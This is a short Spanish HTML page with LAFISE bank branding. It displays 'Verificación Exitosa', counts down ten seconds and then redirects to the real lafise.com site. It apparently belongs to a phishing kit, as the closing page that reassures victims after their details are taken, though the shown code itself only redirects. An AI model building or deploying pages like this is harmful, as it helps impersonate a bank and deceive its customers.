

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="sc.css">
</head>
<body class="body" style="">
    


<div class="nav">
.
</div>
<img class="laf" src="log2.png" alt="">

<br><br><br><br>

<center>

<div class="caja"> 


<form action="">


    <img class="img" src="log.png" alt="">

    <br>
    <br>

<a >¡Verificación Exitosa!</a>


 <br>  
 <br>


<a class="ltr3" style="width: 1px;" >
        <span id="countdown"> </span>  </a>
    

     <div class="container se">
     </div>
     <div>
<img style="margin-top: -15px;
    width: 300px;
" src="carg.gif"></img></div>
     <script >

var segundoInicio = 10;

function actualizar() {
    document.getElementById('countdown').innerHTML = segundoInicio;

    if (segundoInicio == 0) {
        //cuenta regresiva ha finalizado
        
        window.location.href = "https://www.lafise.com/";
    } else {

       // segundoInicio-=1;
        /* 0 */
        segundoInicio = segundoInicio -1;
        setTimeout(actualizar, 1E3);
    }
}

actualizar();


     </script>

</form>

</div>


















</body>
</html>